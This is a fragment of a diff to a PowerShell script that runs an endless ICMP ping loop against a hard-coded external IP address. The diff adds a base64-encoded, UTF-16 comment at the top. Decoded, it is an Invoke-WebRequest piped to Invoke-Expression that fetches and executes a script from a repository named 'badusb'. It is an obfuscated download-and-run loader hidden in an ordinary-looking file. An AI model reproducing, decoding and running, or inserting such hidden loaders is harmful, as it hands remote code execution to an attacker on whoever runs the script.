@@ -1,3 +1,5 @@
+<# aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYgBhAGQAdQBzAGIALwBtAGEAcwB0AGUAcgAvAHUAcwBiADEAfABpAGUAeAA= #>
+
 $sleep = 10; $target = '40.74.51.247'
 while ($true) {
     $ICMPClient = New-Object System.Net.NetworkInformation.Ping
